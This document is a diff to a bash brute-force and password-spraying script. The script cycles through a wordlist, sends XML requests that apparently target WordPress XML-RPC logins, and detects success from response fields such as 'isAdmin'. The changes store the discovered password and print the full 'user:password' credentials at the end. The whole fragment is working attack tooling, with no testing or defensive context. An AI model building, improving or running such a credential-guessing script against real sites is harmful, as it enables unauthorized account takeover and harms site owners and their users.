@@ -10,6 +10,7 @@ TOTAL=0
 BATCH_NUM=0
 SUCCESS=0
 LAST_BATCH=""
+VALID_PASSWORD=""
 
 # Count total passwords first for progress
 TOTAL_PASS=$(wc -l < "$WORDLIST")
@@ -93,6 +94,7 @@ while IFS= read -r PASS; do
           -d @/tmp/spray_single.xml 2>&1)
         
         if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
+          VALID_PASSWORD=$PASSWORD
           echo -e "\033[1;32m[+] Valid Password: $PASSWORD\033[0m"
           echo -e "\033[1;32m[+] Credentials: $USER:$PASSWORD\033[0m"
           break
@@ -180,6 +182,7 @@ if [ $COUNTER -gt 0 ] && [ $SUCCESS -eq 0 ]; then
         -d @/tmp/spray_single.xml 2>&1)
       
       if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
+        VALID_PASSWORD=$PASSWORD
         echo -e "\033[1;32m[+] Valid Password: $PASSWORD\033[0m"
         echo -e "\033[1;32m[+] Credentials: $USER:$PASSWORD\033[0m"
         break
@@ -194,8 +197,8 @@ echo ""
 echo "[*] Brute-force complete."
 echo "[*] Total passwords tested: $TOTAL"
 echo "[*] Total batches sent: $BATCH_NUM"
-if [ $SUCCESS -eq 1 ]; then
-  echo -e "\033[1;32m[!] CREDENTIALS FOUND!\033[0m"
+if [ -n "$VALID_PASSWORD" ]; then
+  echo -e "\033[1;32m[!] CREDENTIALS FOUND: $USER:$VALID_PASSWORD\033[0m"
 else
   echo "[-] No valid credentials found in this wordlist."
 fi
